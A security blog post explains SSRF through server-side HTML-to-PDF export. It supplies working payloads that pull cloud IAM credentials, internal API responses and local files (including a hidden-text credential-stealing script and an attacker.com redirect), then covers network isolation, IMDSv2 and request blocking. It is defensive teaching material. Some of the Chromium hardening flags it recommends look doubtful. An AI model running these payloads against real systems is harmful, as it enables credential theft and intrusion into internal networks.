<!-- tags: security-research, web-security, ssrf -->
<!-- date: 2026-02-25 -->
# Your PDF Export Is an SSRF: How Document Renderers Become Server-Side Browsers

*A technical walkthrough of server-side request forgery through HTML-to-PDF conversion, written for engineers who build "Export as PDF" features and don't realize they've deployed a headless browser with network access to production infrastructure.*

---

## The Thesis

If your application converts user-supplied HTML (or Markdown, or rich text) into a PDF on the server, you've given your users a server-side browser. That browser can fetch URLs. It runs on your internal network. It can reach your metadata service, your internal APIs, your admin panels, and your cloud credentials endpoint. The user controls what it fetches.

This is server-side request forgery through a feature, not a bug. The PDF just happens to be the delivery mechanism for the response.

---

## How It Works

Most HTML-to-PDF pipelines work by rendering the HTML in a headless browser or browser-like engine on the server:

- **wkhtmltopdf** — wraps an old QtWebKit engine
- **Puppeteer / Playwright** — drives headless Chrome/Chromium
- **WeasyPrint** — Python library, fetches external resources via HTTP
- **Prince** — commercial XML/HTML formatter, fetches URLs
- **LibreOffice headless** — converts HTML/DOCX to PDF, resolves external references
- **Chrome DevTools Protocol** — `page.pdf()` on a headless Chrome instance

Every one of these, by default, will resolve URLs found in the HTML document. That means `<img>`, `<link>`, `<iframe>`, `<script>`, `<object>`, `<embed>`, CSS `url()`, `@import`, `@font-face`, SVG `xlink:href`, and HTML `<meta http-equiv="refresh">` are all potential fetch vectors.

The user provides the HTML. The server renders it. The server makes the HTTP request. The response ends up in the PDF.

---

## The Simplest Attack

Submit this as the body of a "generate invoice" or "export report" feature:

```html
<html>
<body>
  <h1>Invoice #1337</h1>
  <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
       style="width: 800px;">
  <p>Thank you for your business.</p>
</body>
</html>
```

If the server is on AWS and IMDSv1 is enabled, the rendered PDF will contain a screenshot of the IAM role credentials endpoint. The `<img>` tag fails to render as an image (it's JSON, not a PNG), but many renderers expose the raw response or an error message containing the response body. Even when they don't, there are better techniques.

A cleaner extraction using CSS:

```html
<style>
  @font-face {
    font-family: "exfil";
    src: url("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
  }
</style>
<body style="font-family: exfil;">Looks like a normal document.</body>
```

Or using an `<iframe>` to embed the response directly in the rendered page:

```html
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        width="800" height="600">
</iframe>
```

Or the Swiss army knife — `<object>`:

```html
<object data="http://internal-admin.corp:8080/api/users"
        type="text/html" width="800" height="600">
</object>
```

The PDF is the exfiltration channel. Whatever the server-side renderer fetches, the attacker receives back as a rendered page in the PDF file they download.

---

## What's Reachable

The renderer runs on your server. Everything your server can reach, the renderer can reach.

**Cloud metadata services.** AWS (`169.254.169.254`), GCP (`metadata.google.internal`), Azure (`169.254.169.254`). These are the crown jewels. A single SSRF to the metadata endpoint can yield temporary IAM credentials, service account tokens, project IDs, custom metadata, and startup scripts. The Capital One breach in 2019 was exactly this pattern — SSRF through a misconfigured WAF to the EC2 metadata endpoint, yielding S3 credentials for 100 million customer records.

**Internal APIs.** Your service mesh, your internal admin tools, your monitoring dashboards, your CI/CD pipeline — anything on the private network that your PDF-rendering service can route to. Internal services usually don't authenticate requests from trusted network peers. An internal `http://user-service.internal:3000/admin/users` that would never be exposed to the internet is one `<iframe>` away.

**Localhost services on the rendering host.** Same as DNS rebinding, but easier — the renderer is already on the host. `http://127.0.0.1:6379/` (Redis), `http://127.0.0.1:9200/` (Elasticsearch), `http://127.0.0.1:5984/` (CouchDB). Redis in particular is exploitable because it speaks a text protocol — you can send arbitrary commands through a crafted HTTP request that Redis will partially parse.

**Cloud provider internal APIs.** On GCP, `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` returns an OAuth2 token for the instance's service account. On AWS, the instance profile credentials at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` include `AccessKeyId`, `SecretAccessKey`, and `SessionToken`. These tokens typically have far more permissions than the PDF rendering feature needs.

**File system access.** Many renderers support the `file://` protocol. `<iframe src="file:///etc/passwd">` or `<img src="file:///proc/self/environ">` can read local files and environment variables (which often contain database credentials, API keys, and secrets).

---

## A Working Exploit Chain

Here's a realistic scenario against a SaaS application that offers "Export to PDF" on user-generated reports.

### Step 1: Enumerate the environment

```html
<!-- Discover what cloud we're on -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="200"></iframe>

<!-- Read env vars for secrets -->
<iframe src="file:///proc/self/environ" width="800" height="200"></iframe>

<!-- Check what's listening locally -->
<iframe src="http://127.0.0.1:6379/" width="800" height="200"></iframe>
```

### Step 2: Steal cloud credentials

```html
<html>
<head>
  <script>
    // Fetch the IAM role name, then fetch its credentials
    async function steal() {
      try {
        const roleRes = await fetch(
          'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
        );
        const roleName = (await roleRes.text()).trim();

        const credsRes = await fetch(
          `http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`
        );
        const creds = await credsRes.text();

        document.getElementById('output').textContent = creds;
      } catch(e) {
        document.getElementById('output').textContent = 'Error: ' + e.message;
      }
    }
    steal();
  </script>
</head>
<body>
  <h1>Quarterly Report</h1>
  <pre id="output" style="font-size: 8px; color: #fff; background: #fff;">
    Loading...
  </pre>
</body>
</html>
```

If the renderer executes JavaScript (Puppeteer, Playwright, and wkhtmltopdf all do by default), this fetches the IAM credentials and writes them into the PDF. The white-on-white text makes it invisible to anyone casually viewing the PDF, but trivially extractable by selecting all text.

### Step 3: Pivot

With the IAM credentials, the attacker can now interact with AWS services — S3 buckets, DynamoDB tables, SQS queues, Lambda functions — limited only by the role's permissions. And since the PDF rendering service is often over-provisioned ("it needs S3 access to store the generated PDFs"), the credentials frequently grant far more access than the feature requires.

---

## Why "Just Sanitize the HTML" Doesn't Work

The standard rebuttal: "We sanitize user input. We strip dangerous tags."

Here's why that's insufficient:

**The fetch surface is enormous.** You'd need to strip or rewrite `<img>`, `<link>`, `<script>`, `<style>`, `<iframe>`, `<object>`, `<embed>`, `<video>`, `<audio>`, `<source>`, `<track>`, `<svg>`, and every CSS property that accepts `url()` — which includes `background`, `background-image`, `border-image`, `content`, `cursor`, `filter`, `list-style-image`, `mask`, `mask-image`, `@import`, `@font-face src`, and others. Missing one is enough.

**CSS is Turing-incomplete but fetch-complete.** Even if you strip all HTML tags except basic formatting, CSS `url()` in inline styles can fetch arbitrary URLs:

```html
<div style="background: url('http://169.254.169.254/latest/meta-data/')">
  Totally innocent styled div.
</div>
```

**SVG is an entire attack surface.** SVG files can contain `<foreignObject>` (which embeds arbitrary HTML), `<image xlink:href="...">` (which fetches URLs), `<use xlink:href="...">` (which can reference external documents), and even `<script>` tags. An SVG uploaded as a "logo" and rendered in the PDF is a complete SSRF vector.

**Relative URLs bypass naive filters.** If you only block absolute URLs starting with `http://169.254`, the attacker uses a redirect:

```html
<img src="https://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/">
```

The attacker's server responds with `302 Location: http://169.254.169.254/...` and the renderer follows it. Your allowlist saw `https://attacker.com` and let it through.

**Markdown isn't safe either.** If your pipeline is Markdown → HTML → PDF, the Markdown can contain raw HTML (most Markdown parsers allow it by default), image references `![](http://169.254.169.254/)`, and link references that some renderers will pre-fetch.

---

## The Renderer Comparison

Not all renderers are equally exploitable. Here's what each one fetches by default:

| Renderer | JS Execution | `file://` | HTTP Fetch | `<iframe>` | CSS `url()` |
|---|---|---|---|---|---|
| **Puppeteer/Playwright** | Yes | Configurable | Yes | Yes | Yes |
| **wkhtmltopdf** | Yes | Yes (!) | Yes | Yes | Yes |
| **WeasyPrint** | No | No | Yes | No | Yes |
| **Prince** | No | Configurable | Yes | Partial | Yes |
| **LibreOffice** | Configurable | Yes | Yes | N/A | Yes |
| **Chrome `--print-to-pdf`** | Yes | Configurable | Yes | Yes | Yes |

wkhtmltopdf is the worst offender — it's based on an unmaintained QtWebKit fork, executes JavaScript by default, supports `file://` URLs with no restrictions, and has known CVEs specifically for SSRF. It's also the most widely deployed PDF renderer in the open-source ecosystem. If you grep your dependencies for `wkhtmltopdf`, now would be a good time.

---

## What Actually Works

### Network isolation (the real fix)

Run the PDF renderer in a network-restricted environment:

```dockerfile
# Dockerfile for isolated PDF renderer
FROM node:20-slim

# Install Chromium
RUN apt-get update && apt-get install -y chromium --no-install-recommends

# Create a non-root user
RUN useradd -m renderer

# Network policy should block all egress except:
# - The specific domain(s) for legitimate assets (your CDN)
# - Nothing else. Especially not 169.254.169.254.

USER renderer
WORKDIR /app
COPY . .
CMD ["node", "render-service.js"]
```

Combined with a Kubernetes NetworkPolicy or AWS security group:

```yaml
# k8s NetworkPolicy: deny all egress except DNS and your CDN
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: pdf-renderer-egress
spec:
  podSelector:
    matchLabels:
      app: pdf-renderer
  policyTypes: ["Egress"]
  egress:
    - to:
        - namespaceSelector: {}
      ports:
        - port: 53          # DNS
          protocol: UDP
    - to:
        - ipBlock:
            cidr: 0.0.0.0/0
            except:
              - 169.254.0.0/16   # block metadata
              - 10.0.0.0/8       # block internal
              - 172.16.0.0/12    # block internal
              - 192.168.0.0/16   # block internal
              - 127.0.0.0/8      # block localhost
```

This is the only mitigation that works regardless of which HTML tags or CSS properties the attacker uses. If the network can't reach the target, the SSRF has no effect.

### IMDSv2 (defense in depth for AWS)

AWS IMDSv2 requires a PUT request with a custom header to obtain a session token before any metadata reads. Headless browsers making GET requests (from `<img>`, `<iframe>`, CSS `url()`) can't satisfy this requirement. This blocks the most damaging SSRF vector — credential theft from the metadata service.

```bash
# Enforce IMDSv2 on all instances
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled
```

This should be on by default everywhere. It isn't, and AWS won't break backward compatibility by changing the default. Turn it on manually for every instance and every launch template.

### Disable unnecessary renderer features

```javascript
// Puppeteer: restrict what the renderer can do
const browser = await puppeteer.launch({
  args: [
    '--no-sandbox',  // if in Docker (already isolated)
    '--disable-gpu',
    '--disable-dev-shm-usage',
    // Block all network requests except data: URIs and your CDN
    '--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE your-cdn.com',
    // Disable file:// access
    '--disable-web-security=false',
    '--allow-file-access-from-files=false',
  ],
});

const page = await browser.newPage();

// Intercept and block requests to internal IPs
await page.setRequestInterception(true);
page.on('request', (req) => {
  const url = new URL(req.url());
  const hostname = url.hostname;

  // Block metadata endpoints, private IPs, and file:// URIs
  const blocked = [
    /^169\.254\./,
    /^10\./,
    /^172\.(1[6-9]|2\d|3[01])\./,
    /^192\.168\./,
    /^127\./,
    /^0\./,
    /^localhost$/i,
    /^metadata\.google\.internal$/i,
  ];

  if (url.protocol === 'file:' || blocked.some(p => p.test(hostname))) {
    req.abort('blockedbyclient');
    return;
  }

  req.continue();
});
```

### Don't render user HTML at all

The most robust solution: don't give users an HTML-to-PDF pipeline. Generate PDFs programmatically from structured data using libraries that don't fetch URLs:

```python
# Python: generate PDF from data, not from HTML
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

def generate_invoice(invoice_data: dict, output_path: str) -> None:
    c = canvas.Canvas(output_path, pagesize=letter)
    c.setFont("Helvetica-Bold", 16)
    c.drawString(72, 750, f"Invoice #{invoice_data['id']}")
    c.setFont("Helvetica", 12)
    c.drawString(72, 720, f"Customer: {invoice_data['customer']}")
    # ... render from data, never from user-controlled HTML
    c.save()
```

No HTML. No CSS. No URL fetching. No attack surface. The PDF is generated from your data model, not from a user-supplied template. This is the structural fix.

---

## The Pattern

This is the same architectural mistake as DNS rebinding and invisible text injection: **a trust boundary violation disguised as a feature.**

The resume screening system trusts document content. The browser trusts DNS for origin isolation. The PDF renderer trusts HTML for layout instructions. In each case, the "trusted" input contains control-plane directives (keywords, DNS responses, URLs) that cross a security boundary the system designer didn't think about.

The PDF renderer is the most literal version: you've deployed a web browser on your server and pointed it at user-controlled content. When you say it that way, the vulnerability is obvious. But when you say "we added PDF export to our invoice feature," it sounds like a product decision, not a security decision. That's why it keeps happening.

The fix is always the same: don't trust the input to stay in its lane. Sanitization helps but can't cover the full surface area. Network isolation, privilege reduction, and avoiding the dangerous pattern entirely are the mitigations that survive contact with creative attackers.

Your PDF export isn't a document generator. It's an SSRF-as-a-service with a content-type header of `application/pdf`.

---

*Last updated: February 2026*

## References

- [OWASP: Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)
- [HackTricks: Server-Side XSS via PDF Generation](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)
- [AWS: Configure the Instance Metadata Service (IMDSv2)](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [wkhtmltopdf Security Issues](https://wkhtmltopdf.org/status.html)
- [Puppeteer: Request Interception API](https://pptr.dev/api/puppeteer.page.setrequestinterception)
- [Kubernetes NetworkPolicy](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [Bug Bounty Reports: PDF Generator SSRF (HackerOne)](https://hackerone.com/reports/filed?search=pdf+ssrf)
